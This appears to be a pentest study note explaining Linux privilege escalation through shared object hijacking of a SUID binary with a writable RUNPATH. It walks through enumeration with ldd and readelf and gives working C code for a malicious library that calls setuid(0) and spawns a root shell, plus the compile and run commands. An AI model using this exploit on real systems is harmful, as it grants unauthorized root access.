# Shared Object Hijacking

Shared Object Hijacking is a technique where a binary loads a malicious shared object instead of the legitimate one due to misconfigured load paths like `RUNPATH`.

**Steps to Exploit:**

![image.png](<../../../.gitbook/assets/image (25).png>)

**Identify a SUID binary:**

```bash
ls -la payroll
```

**Check its linked libraries using `ldd`:**

```bash
ldd payroll
```

<figure><img src="../../../.gitbook/assets/image 1 (12).png" alt=""><figcaption></figcaption></figure>

**Look for non-standard paths (e.g., `/development`) and check if the folder is writable:**

```bash
ls -lad /development
```

<figure><img src="../../../.gitbook/assets/image 2 (9).png" alt=""><figcaption></figcaption></figure>

**Verify the RUNPATH using `readelf`:**

```bash
readelf -d payroll | grep PATH
```

**Check for missing function symbols when copying a standard library:**

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
```

**Create a malicious shared object with the missing function (`dbquery`):**

```c
// src.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

**Compile the malicious library:**

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

**Execute the vulnerable binary:**

```bash
./payroll
```

<figure><img src="../../../.gitbook/assets/image 3 (7).png" alt=""><figcaption></figcaption></figure>
